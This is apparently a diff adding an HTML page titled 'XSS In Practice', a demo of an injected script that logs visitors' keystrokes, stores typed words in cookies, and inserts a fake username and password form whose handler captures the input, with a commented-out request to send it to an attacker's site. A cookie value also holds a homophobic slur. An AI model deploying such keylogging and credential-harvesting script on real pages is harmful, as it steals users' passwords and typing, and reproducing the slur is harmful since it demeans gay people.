@@ -1,0 +1,76 @@
+<html>
+
+<head>
+
+</head>
+
+<body>
+    <p name="output"></p>
+    <script>
+        // XSS In Practice
+        var sentence = "";
+        var word = "";
+        document.onkeydown = function (evt) {
+            evt = evt || window.event;
+            if (evt.keyCode == 32) {
+                sentence += word;
+                sentence += " ";
+                word = "";
+            }
+            else {
+                if (evt.keyCode == 190) {
+                    sentence += word;
+                    console.log(sentence);
+                    sentence = "";
+                    word = "";
+                }
+                else {
+                    word += evt.key;
+                }
+            }
+        };
+        window.onbeforeunload = function () {
+            document.cookie = "username=faggot";
+            document.cookie = "word=" + word;
+            document.cookie = "sentence=" + sentence;
+        }
+
+        var xhttp = new XMLHttpRequest();
+
+        var form = document.createElement("form");
+        form.setAttribute('method', "post");
+        form.addEventListener("submit", ajaxRoutine);
+        //form.setAttribute('onclick', "alert('Hallo')");
+
+        var username = document.createElement("input"); //input element, text
+        username.setAttribute('type', "text");
+        username.setAttribute('name', "username");
+
+        var password = document.createElement("input"); //input element, text
+        password.setAttribute('type', "password");
+        password.setAttribute('name', "Password");
+
+        var submit = document.createElement("input"); //input element, Submit button
+        submit.setAttribute('type', "submit");
+        submit.setAttribute('value', "Submit");
+
+        form.appendChild(username);
+        form.appendChild(password);
+        form.appendChild(submit);
+
+        //and some more input elements here
+        //and dont forget to add a submit button
+
+        document.getElementsByTagName('body')[0].appendChild(form);
+
+        function ajaxRoutine () {
+            // xhttp.open("POST", "output", true); //This should work just fine. 
+            // xhttp.send(username + " " + password); // Sends information to "output". doesn't work cause output should be your own site.
+            console.log(username + " " + password);
+        }
+
+    </script>
+    <form>
+</body>
+
+</html>
